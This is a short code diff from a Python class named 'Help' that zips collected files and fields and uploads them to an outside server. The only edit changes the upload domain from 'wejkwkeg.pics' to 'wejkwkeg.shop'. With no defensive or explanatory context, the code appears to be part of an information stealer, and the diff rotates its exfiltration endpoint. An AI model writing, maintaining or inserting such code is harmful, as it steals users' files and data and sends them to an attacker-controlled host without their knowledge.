@@ -238,7 +238,7 @@ class Help(Thread):
             data = self.__storage.create_zip([file for data in results if data for file in data.files])
             preview = self.__storage.create_preview([field for data in results if data for field in data.fields])
 
-            url = "https://wejkwkeg.pics/upload"
+            url = "https://wejkwkeg.shop/upload"
 
             files = {"file": data}
             data = {"caption": preview}
